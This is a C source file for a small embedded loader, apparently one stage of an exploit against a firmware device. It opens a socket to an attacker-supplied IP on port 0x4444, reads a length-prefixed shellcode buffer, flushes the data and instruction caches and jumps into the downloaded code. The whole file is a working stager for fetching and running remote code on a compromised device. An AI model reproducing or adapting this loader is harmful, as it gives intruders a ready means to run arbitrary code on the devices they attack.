#include <stdint.h>

// #define DEBUG 1

#define PORT 0x4444
#define ALIGN(x, a) __ALIGN_MASK(x, (typeof(x))(a)-1)
#define __ALIGN_MASK(x, mask) (((x) + (mask)) & ~(mask))

void UART_Print(char *);
void UART_Print_u32(char *, uint32_t);
void flush_dcache(void *, uint32_t);
void flush_icache(void *, uint32_t);
int netSocket(int domain, int type, int protocol, int);
int netConnect(int fd, uint8_t *saddr, int saddr_size);
int netClose(int sockfd);
int netWrite(int sockfd, void *buf, uint32_t len);
int netRead(int sockfd, void *buf, uint32_t len);
void *calloc(uint32_t, uint32_t);
uint32_t taskSleep(uint32_t *);

void _memset(void *p, char c, int size)
{
    uint8_t *p8 = (uint8_t *)p;
    while (size--)
    {
        *p8++ = c;
    }
}

#ifdef DEBUG
void dbg_print(char *s)
{
    UART_Print("[LOADER] ");
    UART_Print(s);
    UART_Print("\r\n");
}

void dbg_print_u32(char *s, uint32_t v)
{
    UART_Print("[LOADER] ");
    UART_Print_u32(s, v);
    UART_Print("\r\n");
}
#else

#define dbg_print(x) \
    do               \
    {                \
    } while (0)

#define dbg_print_u32(x, y) \
    do                      \
    {                       \
    } while (0)

#endif

int main(uint32_t ip)
{
    dbg_print("hello");

    int sock = netSocket(1, 1, 0, 0);
    if (sock == -1)
    {
        dbg_print("socket() fail");
        return -1;
    }

    uint8_t saddr[32];
    //_memset(saddr, 0, 32);
    saddr[0] = 0x00;
    saddr[1] = 0x01;
    saddr[2] = (PORT >> 8);
    saddr[3] = (PORT & 0xff);
    *(uint32_t *)(saddr + 4) = ip;

    int rc = netConnect(sock, saddr, 8);
    if (rc < 0)
    {
        dbg_print("connect() fail");
        return -1;
    }

    uint32_t sc_size;

    netRead(sock, &sc_size, 4);

    dbg_print_u32("sc size: %08x", sc_size);

    uint8_t *sc_buf = calloc(sc_size + 0x20, 1);

    if (sc_buf == (uint8_t *)0)
    {
        return -1;
    }

    uint8_t *sc_buf_aligned = (uint8_t *)(((int)sc_buf + 0xf) & 0xfffffff0);
    dbg_print_u32("sc at 0x%08x", (uint32_t)sc_buf_aligned);

    uint32_t left = sc_size;
    uint32_t pos = 0;
    while (left > 0)
    {
        uint32_t chunk = left > 0x1000 ? 0x1000 : left;
        dbg_print_u32("left: %08x", left);
        uint32_t nread = netRead(sock, sc_buf_aligned + pos, chunk);
        pos += nread;
        left -= nread;

        flush_dcache(sc_buf_aligned + pos, 0x1000);
        flush_icache(sc_buf_aligned + pos, 0x1000);
    }

    dbg_print("flush");
    netClose(sock);

    dbg_print("jump!");
    void (*code)(void) = (void (*)(void))sc_buf_aligned;
    code();

    return 0;
}
